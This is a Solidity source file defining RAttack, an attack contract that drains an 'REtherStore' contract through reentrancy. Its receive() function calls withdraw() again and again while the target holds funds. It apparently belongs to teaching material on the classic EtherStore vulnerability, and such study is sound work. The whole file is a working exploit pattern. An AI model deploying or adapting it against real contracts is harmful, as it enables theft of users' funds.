// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface IREtherStore {
    function deposit() external payable;

    function withdraw() external;

    function balance() external view returns (uint256);
}

/// @title RAttack
/// @author mektigboy
contract RAttack {
    //////////////
    /// ERRORS ///
    //////////////

    error RAttack__UnmetMinimumETH();

    ///////////////
    /// STORAGE ///
    ///////////////

    IREtherStore public immutable rEtherStore;

    ///////////////////
    /// CONSTRUCTOR ///
    ///////////////////

    constructor(address _rEtherStore) {
        rEtherStore = IREtherStore(_rEtherStore);
    }

    ///////////////
    /// RECEIVE ///
    ///////////////

    receive() external payable {
        if (address(rEtherStore).balance >= 1 ether) {
            rEtherStore.withdraw();
        }
    }

    //////////////////////
    /// EXTERNAL LOGIC ///
    //////////////////////

    function initializeAttack() external payable {
        if (msg.value != 1 ether)
            revert RAttack__UnmetMinimumETH();

        rEtherStore.deposit{value: 1 ether}();
        rEtherStore.withdraw();
    }

    ///////////////
    /// GETTERS ///
    ///////////////

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
